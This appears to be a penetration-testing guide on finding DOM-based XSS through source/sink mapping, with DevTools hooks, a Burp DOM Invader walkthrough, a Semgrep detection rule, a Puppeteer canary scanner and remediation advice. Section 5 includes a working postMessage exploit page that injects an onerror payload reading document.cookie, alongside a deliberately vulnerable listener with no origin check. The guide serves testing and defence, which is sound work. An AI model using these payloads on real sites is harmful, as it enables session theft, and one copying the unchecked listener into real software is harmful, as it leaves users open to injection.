# DOM XSS Source/Sink Analysis Guide

> Systematic methodology for identifying DOM-based XSS vulnerabilities through source/sink mapping, taint tracking, and automated discovery using browser DevTools and specialized tooling.

## 1. Understanding Sources and Sinks

Sources are DOM properties where attacker-controlled data enters the application. Sinks are dangerous functions that execute or render that data.

```javascript
// Common Sources (attacker-controlled input)
document.URL
document.documentURI
document.referrer
location.href
location.search
location.hash
window.name
document.cookie
postMessage data
Web Storage (localStorage, sessionStorage)
```

```javascript
// Dangerous Sinks (code execution / HTML injection)
eval()
setTimeout(string)
setInterval(string)
Function(string)
document.write()
document.writeln()
element.innerHTML
element.outerHTML
element.insertAdjacentHTML()
location.href = ...
location.assign()
location.replace()
```

## 2. Manual Taint Tracking with DevTools

Use Chrome DevTools to trace data flow from source to sink.

```javascript
// Step 1: Set breakpoints on known sinks
// In Console, override dangerous functions:
const originalWrite = document.write;
document.write = function(content) {
  console.trace('document.write called with:', content);
  debugger;
  return originalWrite.apply(this, arguments);
};

// Monitor innerHTML assignments via MutationObserver
const observer = new MutationObserver((mutations) => {
  mutations.forEach((m) => {
    if (m.type === 'childList' && m.addedNodes.length) {
      console.trace('DOM modified:', m.target, m.addedNodes);
    }
  });
});
observer.observe(document.body, { childList: true, subtree: true });
```

## 3. Automated Discovery with DOM Invader

Burp Suite's DOM Invader automates source/sink detection.

```bash
# Enable DOM Invader in Burp's embedded browser
# 1. Open Burp > Proxy > Intercept > Open Browser
# 2. Navigate to target application
# 3. Open DevTools > DOM Invader tab
# 4. Enable "Sources" and "Sinks" toggles
# 5. Inject canary into URL fragment:
https://target.com/page#<dom-invader-canary>

# DOM Invader will highlight:
# - Which sources contain the canary
# - Which sinks the canary reaches
# - The full taint flow path
```

## 4. Static Analysis with Semgrep

```bash
# Install semgrep and run DOM XSS rules
pip install semgrep

# Custom rule for innerHTML assignment from URL params
cat > dom-xss-rules.yaml << 'EOF'
rules:
  - id: dom-xss-innerhtml-from-url
    patterns:
      - pattern: |
          $EL.innerHTML = $EXPR
      - metavariable-pattern:
          metavariable: $EXPR
          patterns:
            - pattern-either:
              - pattern: location.hash
              - pattern: location.search
              - pattern: document.URL
              - pattern: new URLSearchParams(...).get(...)
    message: "Potential DOM XSS: URL-controlled data flows to innerHTML"
    severity: ERROR
    languages: [javascript, typescript]
EOF

semgrep --config dom-xss-rules.yaml ./src/
```

## 5. Exploiting postMessage Sinks

```javascript
// Identify postMessage listeners
// In DevTools Console:
const listeners = getEventListeners(window);
console.log('message listeners:', listeners.message);

// Check if origin validation is missing or weak:
// Vulnerable pattern:
window.addEventListener('message', function(e) {
  // No origin check!
  document.getElementById('output').innerHTML = e.data.html;
});

// Exploitation from attacker page:
<iframe src="https://vulnerable.com/page" id="target"></iframe>
<script>
  document.getElementById('target').onload = function() {
    this.contentWindow.postMessage(
      {html: '<img src=x onerror=alert(document.cookie)>'},
      '*'
    );
  };
</script>
```

## 6. jQuery Sink Detection

```javascript
// jQuery introduces additional sinks
// Dangerous jQuery methods:
$(location.hash)           // Selector injection
$('<img src=x onerror=...>')  // HTML creation
$.html(userInput)          // innerHTML equivalent
$.append(userInput)        // DOM injection
$.globalEval(userInput)    // eval equivalent

// Detection script for jQuery sink usage:
// Paste in DevTools Console
const jqSinks = ['html', 'append', 'prepend', 'after', 'before',
                 'replaceWith', 'wrap', 'wrapAll', 'wrapInner'];
jqSinks.forEach(method => {
  const orig = $.fn[method];
  $.fn[method] = function() {
    console.trace(`jQuery.${method} called:`, arguments[0]);
    return orig.apply(this, arguments);
  };
});
```

## 7. Building a Taint Flow Map

```bash
# Use retire.js to find vulnerable JS libraries
npm install -g retire
retire --js --path ./public/js/

# Use puppeteer for automated crawling and sink detection
cat > dom-xss-scanner.js << 'EOF'
const puppeteer = require('puppeteer');

async function scanForDOMXSS(url) {
  const browser = await puppeteer.launch();
  const page = await browser.newPage();

  // Inject monitoring before page loads
  await page.evaluateOnNewDocument(() => {
    window.__xss_sinks = [];
    const origWrite = document.write;
    document.write = function(s) {
      window.__xss_sinks.push({sink: 'document.write', value: s});
      return origWrite.apply(this, arguments);
    };
  });

  // Test with canary in various sources
  const canary = 'XSS_CANARY_12345';
  await page.goto(`${url}#${canary}`);
  await page.waitForTimeout(2000);

  const results = await page.evaluate(() => window.__xss_sinks);
  const hits = results.filter(r => r.value.includes('XSS_CANARY_12345'));

  console.log(`Found ${hits.length} source-to-sink flows`);
  hits.forEach(h => console.log(`  Sink: ${h.sink}`));

  await browser.close();
}

scanForDOMXSS(process.argv[2]);
EOF
node dom-xss-scanner.js https://target.com/app
```

## 8. Remediation Verification

```javascript
// Safe alternatives to dangerous sinks:
// Instead of innerHTML, use textContent:
element.textContent = userInput;  // Safe: no HTML parsing

// Instead of document.write, use DOM APIs:
const el = document.createElement('div');
el.textContent = userInput;
document.body.appendChild(el);

// For postMessage, always validate origin:
window.addEventListener('message', function(e) {
  if (e.origin !== 'https://trusted.com') return;
  // Process only after origin validation
});

// Use DOMPurify for cases requiring HTML rendering:
import DOMPurify from 'dompurify';
element.innerHTML = DOMPurify.sanitize(userInput);
```
